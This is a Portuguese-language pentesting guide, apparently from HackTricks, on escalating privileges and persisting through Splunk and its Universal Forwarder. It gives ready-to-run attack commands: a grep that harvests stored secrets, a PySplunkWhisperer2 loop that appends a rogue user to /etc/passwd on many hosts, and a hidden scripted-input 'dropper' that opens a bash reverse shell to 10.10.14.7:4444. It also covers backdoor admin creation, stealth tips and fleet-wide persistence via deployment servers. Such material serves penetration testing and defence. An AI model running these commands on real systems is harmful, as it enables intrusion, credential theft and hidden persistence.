# LPE e Persistência no Splunk

{{#include ../../banners/hacktricks-training.md}}

Se, ao **enumerar** uma máquina **internamente** ou **externamente**, você encontrar o **Splunk em execução** (geralmente **8000** para a interface web e **8089** para a API de gerenciamento), credenciais válidas muitas vezes podem ser transformadas em **execução de código** por meio da instalação de apps, scripted inputs ou ações de gerenciamento.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Se o Splunk estiver sendo executado como **root**, isso frequentemente se torna uma **escalada de privilégios** imediata.<sup>[[1]](#references)</sup>

Se você precisa apenas da superfície de ataque remota genérica, enumeração ou do caminho de RCE por upload de app, consulte:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Se você **já for root** e o serviço Splunk não estiver escutando apenas no localhost, você também poderá roubar **hashes de senha do Splunk**, recuperar **segredos criptografados** ou enviar um **app malicioso** para manter a persistência localmente ou em vários forwarders.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Arquivos Locais Interessantes

Ao obter acesso a um host que executa o Splunk ou o Splunk Universal Forwarder, estes geralmente são os caminhos mais interessantes:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefatos importantes:

- **`$SPLUNK_HOME/etc/passwd`**: usuários locais do Splunk e hashes de senha.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: chave usada pelo Splunk para criptografar secrets armazenados em vários arquivos `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: arquivo inicial de bootstrap do admin; útil em golden images e erros de provisioning. Ele é ignorado se `etc/passwd` já existir.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: local onde scripted inputs são comumente habilitados.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** ou **`$SPLUNK_HOME/etc/apps/`**: bons locais para ocultar um app persistente ou revisar o que já está sendo distribuído.<sup>[[11]](#references)</sup>

## Resumo do Exploit do Splunk Universal Forwarder Agent

Para mais detalhes, consulte [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Este é apenas um resumo.<sup>[[1]](#references)</sup>

**Visão geral do exploit:**
Um exploit que tem como alvo o Splunk Universal Forwarder (UF) permite que atacantes com a **agent password** executem código arbitrário em sistemas que executam o agent, comprometendo potencialmente uma grande parte do ambiente.<sup>[[1]](#references)</sup>

**Por que funciona:**

- O serviço de gerenciamento do UF é comumente exposto na **TCP 8089**.<sup>[[6]](#references)</sup>
- Atacantes podem autenticar-se na API e instruir o forwarder a instalar um **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
- A mesma primitive pode ser usada localmente para **LPE** ou remotamente para **RCE**.<sup>[[5]](#references)</sup>
- Ferramentas públicas como **SplunkWhisperer2** criam o app bundle automaticamente e podem adaptar payloads para targets Linux.<sup>[[5]](#references)</sup>

**Formas comuns de recuperar a password:**

- Credenciais em cleartext em documentação, scripts, shares ou automação de deployment.<sup>[[1]](#references)</sup>
- Password hashes dentro de `$SPLUNK_HOME/etc/passwd`, seguidos de cracking offline.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden images ou sobras de provisioning, como `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Impacto:**

- Execução de código em nível SYSTEM/root em cada host comprometido.<sup>[[1]](#references)</sup>
- Deployment de apps persistentes, backdoors ou ransomware.<sup>[[1]](#references)</sup>
- Desativação ou adulteração da telemetria antes que os dados sejam encaminhados.<sup>[[1]](#references)</sup>

**Comando de exemplo para exploração:**

O relatório original demonstra o loop a seguir para enviar um payload a vários forwarders.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizáveis:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistência via Scripted Inputs ou Malicious Apps

Se você tiver **acesso de escrita ao sistema de arquivos** como `root`/`splunk`, ou acesso autenticado para instalar apps, um mecanismo de persistência muito confiável é inserir um **app personalizado** com um **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> A própria documentação do Splunk espera que os scripted inputs estejam em um diretório de app e sejam habilitados a partir de `inputs.conf`.<sup>[[10]](#references)</sup>

Layout típico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` mínimo:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper (usando aquele layout de aplicativo documentado):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- O mesmo truque funciona no **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Os atacantes frequentemente se misturam modificando um add-on legítimo em vez de criar um app obviamente malicioso.<sup>[[2]](#references)</sup>
- Em um **deployment server**, inserir um app malicioso dentro de `deployment-apps/` transforma-se em **persistência em toda a frota**, porque os forwarders consultam o servidor, baixam apps atualizados e frequentemente reiniciam para aplicá-los.<sup>[[11]](#references)[[12]](#references)</sup>

## Roubo de Credenciais e Tomada de Controle do Admin

Se você puder ler os arquivos locais do Splunk, geralmente há dois bons objetivos: recuperar o **acesso de admin do Splunk** e recuperar **credenciais de serviço criptografadas**.<sup>[[8]](#references)</sup>

### Hashes de senha e usuários locais

O Splunk armazena os dados de autenticação local em `etc/passwd`. Dependendo da implantação, quebrar esse arquivo pode recuperar credenciais válidas para a interface web e a API de gerenciamento.<sup>[[1]](#references)[[7]](#references)</sup>

Se você já tiver credenciais válidas de **admin** e o Splunk usar seu backend de autenticação **nativo**, a própria CLI poderá ser usada para persistência.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` e valores criptografados

O Splunk usa `etc/auth/splunk.secret` para proteger valores confidenciais armazenados em vários arquivos de configuração. Se você conseguir roubar tanto o **secret** quanto os arquivos **`.conf`** relevantes, muitas vezes poderá recuperar ou reutilizar:<sup>[[8]](#references)</sup>

- shared secrets de forwarder/indexer, como `pass4SymmKey`
- senhas de chaves privadas TLS, como `sslPassword`
- credenciais de bind LDAP, como `bindDNPassword`

Isso pode viabilizar **lateral movement** mesmo quando a senha do administrador do Splunk não pode ser crackeada.<sup>[[8]](#references)</sup>

### Abuso de `user-seed.conf`

`user-seed.conf` só é consumido durante a primeira inicialização ou quando `etc/passwd` não existe. Isso o torna menos útil em um sistema ativo, mas muito interessante em:<sup>[[9]](#references)</sup>

- templates de instalação comprometidos
- imagens de container
- workflows de provisionamento unattended
- appliances nos quais o Splunk é reinicializado automaticamente

Nesses casos, inserir um `HASHED_PASSWORD` gerado com `splunk hash-passwd` oferece uma forma discreta de recuperar o acesso de administrador após a redeployment.<sup>[[9]](#references)</sup>

## Abusando de Queries do Splunk

Para obter mais detalhes, consulte [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Uma técnica recente útil consiste em abusar de **XSLT fornecido pelo usuário** em versões vulneráveis do Splunk Enterprise para transformar uma conta autenticada com poucos privilégios em **execução de comandos do SO** como o usuário `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Fluxo de alto nível:<sup>[[3]](#references)[[4]](#references)</sup>

1. Autentique-se no Splunk.
2. Faça upload de um arquivo **XSL** malicioso por meio da funcionalidade de preview/upload.
3. Faça o Splunk renderizar os resultados da busca com essa stylesheet enviada a partir do diretório **dispatch**.
4. Use o payload XSLT para gravar um arquivo ou disparar a execução por meio do search pipeline do Splunk, por exemplo, acessando funcionalidades internas como `runshellscript`.

A principal conclusão ofensiva é que esse caminho permite **RCE pós-autenticação sem precisar de app upload**. No Linux, normalmente isso resulta no acesso à conta **`splunk`**, que ainda é valiosa porque esse usuário geralmente é proprietário da árvore da aplicação, pode ler secrets e pode inserir apps persistentes que sobrevivem à perda do shell.<sup>[[3]](#references)[[4]](#references)</sup>

Um path representativo usado durante a exploração é:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Se o Splunk estiver sendo executado com privilégios excessivos, ou se o usuário `splunk` tiver acesso a scripts perigosos, unidades de serviço graváveis ou regras de `sudo` inadequadas, isso se torna uma cadeia de **LPE** simples.

## References

- [1] [Abusando de Splunk Forwarders para RCE e Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Cuidado com TraitorWare: usando Splunk para Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Análise do CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Alterar valores padrão](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Implantar senhas seguras em vários servidores](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Configurar uma entrada scripted](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Criar deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Como ocorrem as atualizações de deployment](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Configurar usuários com a CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
